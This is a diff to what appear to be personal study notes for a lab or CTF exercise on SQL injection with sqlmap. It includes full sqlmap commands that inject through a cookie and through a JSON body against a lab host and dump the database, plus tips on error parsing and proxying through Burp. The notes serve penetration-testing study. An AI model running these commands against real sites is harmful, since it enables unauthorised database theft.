@@ -26,4 +26,6 @@
 
 - For cookies injection, copy as cURL, append `--dump --batch --cokie:"id=1*` e.g `sqlmap 'http://94.237.61.133:50543/case3.php' --compressed -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Connection: keep-alive' -H 'Referer: http://94.237.61.133:50543/case3.php' -H 'Cookie: id=1' -H 'Upgrade-Insecure-Requests: 1' -H 'Priority: u=0, i' --dump --batch --cookie="id=1*"` then go looking in output
 - Similar story for JSON, copy as cURL and it kinda just does it for you `sqlmap 'http://94.237.61.133:50543/case4.php' --compressed -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Content-Type: application/json' -H 'Origin: http://94.237.61.133:50543' -H 'Connection: keep-alive' -H 'Referer: http://94.237.61.133:50543/case4.php' --data-raw '{"id":1}' --batch --dump`
+- Run with `--parse-errors` to print DBMS errors to console for grater clarity on any potential issues
+- You can use `--proxy` to send all data through burp for closer inspection and poking
 
